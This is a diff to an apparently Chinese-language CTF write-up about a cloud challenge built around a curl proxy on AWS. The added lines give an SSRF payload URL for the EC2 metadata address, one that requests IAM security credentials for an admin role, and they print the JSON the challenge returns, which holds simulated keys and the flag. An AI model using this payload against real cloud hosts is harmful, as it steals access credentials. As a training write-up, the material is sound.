@@ -89,5 +89,22 @@ while True:
 这是一道云安全的题目，一个curl的代理，部署在了亚马逊云上面。
 这里需要知道一个知识点：
 EC2实例都会有一个特殊的IP地址，
-`169.254.169.254`
-这是亚马逊云的一个查看元数据的ip
+```
+169.254.169.254
+```
+这是亚马逊云的一个查看元数据的ip。我们可以访问latest/meta-data/查看元数据
+payload：
+```txt
+http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role
+```
+就返回了json：
+```json
+{
+ 'Code': 'Success',
+ 'Type': 'AWS-HMAC', 
+ 'AccessKeyId': 'AKIA_ADMIN_USER_CLOUD', 
+ 'SecretAccessKey': 'POFP{937d870d-bf90-4fc0-a395-7f25ba855696}',
+ 'Token': 'MwZNCNz... (Simulation Token)', 
+ 'Expiration': '2099-01-01T00:00:00Z'
+}
+```
